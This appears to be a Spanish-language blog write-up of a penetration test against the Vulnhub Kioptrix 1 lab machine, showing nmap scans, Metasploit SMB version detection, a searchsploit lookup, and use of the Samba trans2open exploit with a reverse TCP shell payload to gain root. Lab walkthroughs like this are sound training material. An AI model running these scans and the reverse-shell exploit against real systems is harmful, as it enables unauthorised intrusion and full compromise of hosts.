---
title: "Vulnhub #2: Kioptrix 1"
description: Pentesting a máquina Kioptrix en Vulnhub
date: 2025-05-11
scheduled: 2025-05-11
tags:
  - hacking
layout: layouts/post.njk
---

Puedes descargar la máquina vulnerable desde [vulnhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

## Descubrimiento de hosts

1. Escaneamos para descubrir hosts:
nmap -sn <ip>/<rango>

Nos da el siguiente resultado:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-10 09:23 CEST
Nmap scan report for www.adsl.vf (192.168.0.1)
Host is up (0.0048s latency).
Nmap scan report for 192.168.0.10
Host is up (0.082s latency).
Nmap scan report for 192.168.0.16
Host is up (0.00044s latency).
Nmap scan report for 192.168.0.20
Host is up (0.000081s latency).
Nmap scan report for 192.168.0.24
Host is up (0.00041s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 15.31 seconds
```

2. Escaneamos versiones
nmap -sV <ip>

```
 ~ nmap -sV 192.168.0.24
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-10 09:26 CEST
Nmap scan report for 192.168.0.24
Host is up (0.0021s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
```

Vemos que 192.168.0.24 es un redhat con varios puertos abiertos.

Nos interesa el servicio de Samba, pero necesitamos conocer su version antes de atacar.

Con metasploit podemos ejecutar el siguiente scanner:

```
msfconsole
search /scanner/smb/ #para buscar
use /auxiliary/scanner/smb/smb_version
show options
set rhosts 192.168.0.24
```

Al lanzarlo, obtenemos lo siguiente:

```
[*] 192.168.0.24:139      - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.0.24:139      -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.0.24:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Una vez tenemos la version, podemos buscar si existen exploits con `searchsploit <servicio>` y `searchsplot <servicio> <version>`

Con searchsploit samba 2.2.1a nos da el siguiente resultado:

```
------------------------------- ---------------------------------
 Exploit Title                 |  Path
------------------------------- ---------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - tr | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Re | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap O | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial o | linux_x86/dos/36741.py
------------------------------- ---------------------------------
Shellcodes: No Results
```

Para explotar la vulnerabilidad debemos encontrar una en su version.

En concreto, aqui tenemos la vulnerabilidad trans2open, podemos buscarla con `search trans2open` en metasploit.

Debemos configurar el payload con `set payload linux/x86/shell_reverse_tcp` y el rhosts.

Al lanzarlo con run obtenemos una shell con usuario root.
